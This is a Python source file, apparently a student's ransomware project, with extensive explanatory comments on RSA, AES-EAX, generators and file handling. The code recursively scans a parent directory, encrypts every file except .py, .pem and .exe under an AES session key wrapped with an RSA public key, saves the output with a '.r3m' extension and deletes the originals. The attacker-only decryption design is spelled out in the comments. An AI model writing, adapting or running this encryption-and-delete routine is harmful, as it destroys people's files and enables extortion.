import os
os.system("apt install python3-pip")
os.system('pip install pycryptodome')
# The reason why I can not use my DES for this ransomware project is because DES Is a block cipher "SYMMETRIC" encryption.
# You need to create encryption where you are the only one who can decrypt. So you would need a public and private key. Meaning you have to use ASYMMETRIC encryption. The public key generation is through RSA. (Planning to use ECC in the future as RSA could be cracked.)

import base64, os
from pathlib import Path
from Crypto.PublicKey import RSA
# which mode of operation is PKCS1_OAEP? ***
from Crypto.Cipher import PKCS1_OAEP, AES

pubKey = "publickeystring"
pubKey = base64.b64decode(pubKey)


# scandir() is a directory iteration function like os.listdir(), except that instead of returning a list of bare filenames, it yields entry objects that include file type and stat information along with the name. And using such output where it gives you information about the file type, I can check whether or not if the file is "is_file()" or "is_dir()".

# Inside a program, when you call a function that has a yield statement, as soon as yield is encountered, the execution of the function stops and returns an object of the generator to the function caller. In simpler words, the yield keyword  will convert an expression that is specified along with it to a generator object and return it to the caller. Hence, if you want to get the values stored inside the generator object, you need to iterate over it. 

'''
else:
    yield from recursiveScan(entry.path)
'''
# This basically does a recursive scanning of the function all over again using that entry path. ".path" is from os module. The logic behind this loops is that if "is_file()" is not true, then yield its directories because it's probably "is_dir()". Then capture the path of that directory by "entry.path".

def recursiveScan(directories):
    for entry in os.scandir(directories):
        if entry.is_file():
            yield entry
        else:
            # this yield from allows this function to become a recursive function where if the entry is a directory, it runs the recursiveScan() function again with the entry.path (the directory) as the new "directories" object that will be scanned for objects.
            # and once all the subdirectories of subdirectories are completely scanned, it will iterate to the original-level directory and keep going down from there.
            yield from recursiveScan(entry.path)

# with open() - a command that opens a file. And close() closes the file. (obviously). 
# with open('public.pem','rb') as f: - stands for opening up a public key pem file. And 'rb' flag stands for READING in BINARY format. 
# Files are automatically opened in text mode in Python. So, "b" stands for binary mode. "wb" mode stands for opening the file in binary format for WRITING.
# And this converted file is referred to as "f". And using the ".read()", file can be read as an object to be used in the script by converting file content as a STRING.

def encrypt(dataFile, publicKey):
    '''
    EAX mode to allow detection of unauthorization modification(?)
    PKCS1_OAEP is being used as the padding scheme for RSA encryption. The reason why we are doing this is because RSA encryption by itself has potential vulnerabilities, especially when it comes to encrypting small amounts of data. 
    - PKCS1_OAEP.
    '''

    # the 'suffix' property provides the file extension of the given file (in lower case).
    # for example if we are dealing with 'image.JPG' extension = ".jpg"
    extension = dataFile.suffix.lower()
    dataFile = str(dataFile)

    # When used within a with block like this, Python automatically closes the file f after the with block is exited, even if an error occurred. This ensures that the open file is properly closed and resources are cleaned up. It's a good practice to use with when working with file objects.
    with open(dataFile, 'rb') as f:
        data = f.read()
    
    # This line ensures that the data is in bytes format, which is required for the encryption process.
    data = bytes(data)

    # Sessionkey that is being generated her is the key that will actually encrypt using AES.
    key = RSA.import_key(publicKey)
    sessionKey = os.urandom(16)

    # PKCS1_OAEP cipher algorithm
    cipher = PKCS1_OAEP.new(key)
    encryptedSessionKey = cipher.encrypt(sessionKey)

    # Uses the mode of operation EAX. AES uses 16 bit long key.
    # EAX - (Encrypt-then-authenticate-then-translate) mode and PKCS1_OAEP mode differences.
    '''
        EAX mode is a mode of operation for symmetric key cryptography block ciphers such as AES. It's designed to provide both data confidentilaity and data integrity (authenticated encryption)

        EAX mode does use a form of MAC called OMAC1/CMAC, but this is not a padding of the plaintext data like in RSA encryption; instead it's used to ensure data integrity and authenticity.

        PKCS1_OAEP, on the other hand, is a form of padding used specifically with RSA encryption, which is an asymmetric encryption method. RSA encryption is typically used to encrypt the keys that are then used with symmetric encryption, not the actual data itself. Because RSA is often used to encrypt small pieces of data (likey keys), and because it has some potential vulnerabilities when used to encrypt small data, a padding scheme like OAEP is used to increase the security of the RSA encryption.

        RSA with PKCS1_OAEP padding is being used to encrypt the session key, and AES with EAX mode is being used to encrypt the actual data. The use of OAEP padding with RSA here does not replace or eliminate the need for the use of EAX mode with AES; they're serving different purposes in the overall encryption process.
    '''
    cipher = AES.new(sessionKey, AES.MODE_EAX)
    ciphertext, tag = cipher.encrypt_and_digest(data)

    # save the encrypted data to file
    # what is the output of (.split) function?
    # - .split(extension)[0] is to extract the base name of the file without its extension. Hence [0] to direct the first part of the split list. 
    
    fileName = dataFile.split(extension)[0]
    fileExtension = '.r3m'
    encryptedFile = fileName + fileExtension
    # 'tag' is used during decryption to verify the integrity of the ciphertext and ensures it has not been tampered with.

    # since 'f.write()' does not inherently create separate columns or delineate between these objects that is being written into (binaryformat) the file, it means that, to correctly interpret the file later, I msut know exactly the order in which these items were written and how to distinguish them. 
    with open(encryptedFile, 'wb') as f:
        [f.write(x) for x in (encryptedSessionKey, cipher.nonce, tag, ciphertext)]
    os.remove(dataFile)

# change directory to the directory of the script
directory = '../' # change this
excludeExtension = ['.py','.pem','.exe'] # change this

# so after I specify the directory I want to scan, I go through the iterated outputs from the recursiveScan(specified_directory). 
for item in recursiveScan(directory):
    # this converts the item into Path object which allows you to use methods that operate on file paths more conveniently. 
    filePath = Path(item)
    fileType = filePath.suffix.lower()

    if fileType in excludeExtension:
        continue
    encrypt(filePath, pubKey)

